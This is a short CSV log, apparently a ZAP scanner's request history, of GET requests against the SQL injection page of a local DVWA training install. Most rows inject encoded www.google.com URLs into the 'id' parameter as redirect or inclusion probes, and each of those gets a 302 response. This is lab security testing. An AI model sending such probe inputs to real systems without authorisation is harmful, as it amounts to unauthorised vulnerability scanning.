ID,Petición (Tiempo),Marca de tiempo Respuesta,Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo)
23,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/3944188755050753324,404,Not Found,3,161,311
25,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
26,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2Fwww.google.com%2F&Submit=Submit,302,Found,2,628,0
27,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2Fwww.google.com%3A80%2F&Submit=Submit,302,Found,1,628,0
28,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2Fwww.google.com&Submit=Submit,302,Found,1,628,0
29,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DZAP&Submit=Submit,302,Found,1,628,0
30,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DZAP&Submit=Submit,302,Found,2,628,0
31,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=www.google.com%2F&Submit=Submit,302,Found,1,628,0
32,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=www.google.com%3A80%2F&Submit=Submit,302,Found,2,628,0
33,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=www.google.com&Submit=Submit,302,Found,1,628,0
34,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=www.google.com%2Fsearch%3Fq%3DZAP&Submit=Submit,302,Found,1,628,0
35,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=www.google.com%3A80%2Fsearch%3Fq%3DZAP&Submit=Submit,302,Found,1,628,0
